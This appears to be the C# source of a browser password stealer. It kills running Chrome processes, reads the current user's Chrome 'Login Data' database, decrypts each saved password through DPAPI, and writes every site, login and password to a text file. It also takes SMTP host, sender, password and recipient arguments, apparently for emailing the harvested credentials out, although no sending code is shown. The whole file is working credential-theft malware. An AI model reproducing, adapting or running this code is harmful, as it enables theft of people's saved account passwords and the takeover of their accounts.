using System;
using System.Text;
using System.IO;
using System.Data;
using System.Data.SQLite;
using System.Diagnostics;

namespace dpapiPass
{
    public class ChromePasswordDecrypt
    {
        private static ChromePasswordDecrypt instance;

        public const string PATH = "output.txt";
        public const string HOST = "host";
        public const string EMAIL_FROM = "email_from";
        public const string PASSWORD = "password";
        public const string EMAIL_TO = "email_to";

        private string emailFrom, emailTo, host, password;

        public ChromePasswordDecrypt(){}

        public static ChromePasswordDecrypt getInstance()
        {
            if (instance == null)
                instance = new ChromePasswordDecrypt();
            return instance;
        }

        public void killChromeProcess()
        {
            Process[] ps1 = System.Diagnostics.Process.GetProcessesByName("chrome");
            foreach (Process p1 in ps1)
                p1.Kill();
        }

        public void onCreateFile()
        {
            if (File.Exists(PATH))
                return;

            var _output = File.Create(PATH);
            _output.Close();
        }

        public void writePassToFile(int rows, DataTable db)
        {
            byte[] entropy = null;
            string description;
            StreamWriter sw = new StreamWriter(PATH, false, Encoding.UTF8);
            for (int i = 0; i < rows; i++)
            {
                string url = db.Rows[i][1].ToString();
                string login = db.Rows[i][3].ToString();
                byte[] byteArray = (byte[])db.Rows[i][5];
                byte[] decrypted = DPAPI.Decrypt(byteArray, entropy, out description);
                string password = new UTF8Encoding(true).GetString(decrypted);
                sw.WriteLine("----------------------------");
                sw.WriteLine($"Номер: {i}");
                sw.WriteLine($"Сайт: {url}");
                sw.WriteLine($"Логин: {login}");
                sw.WriteLine($"Пароль: {password}");
            }
            sw.Close();
        }

        public void runParametrs(string[] args)
        {
            int i = 0;
            foreach(string s in args)
            {
                switch (i)
                {
                    case 0:
                        host = s;
                        break;
                    case 1:
                        emailFrom = s;
                        break;
                    case 2:
                        password = s;
                        break;
                    case 3:
                        emailTo = s;
                        break;
                }
                i++;
            }
        }

        public void decryptPass()
        {
            string fileDb = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Google\Chrome\User Data\Default\Login Data";
            string connectionString = $"Data Source = {fileDb}";
            string db_fields = "logins";
            DataTable db = new DataTable();
            string sql = $"SELECT * FROM {db_fields}";
            using (SQLiteConnection connection = new SQLiteConnection(connectionString))
            {
                SQLiteCommand command = new SQLiteCommand(sql, connection);
                SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
                adapter.Fill(db);
            }
            int rows = db.Rows.Count;
            writePassToFile(rows, db);
        }

        public string get(string type)
        {
            if (type == HOST)
                return host;

            if (type == EMAIL_FROM)
                return emailFrom;

            if (type == PASSWORD)
                return password;

            if (type == EMAIL_TO)
                return emailTo;

            return "";
        }
    }
}

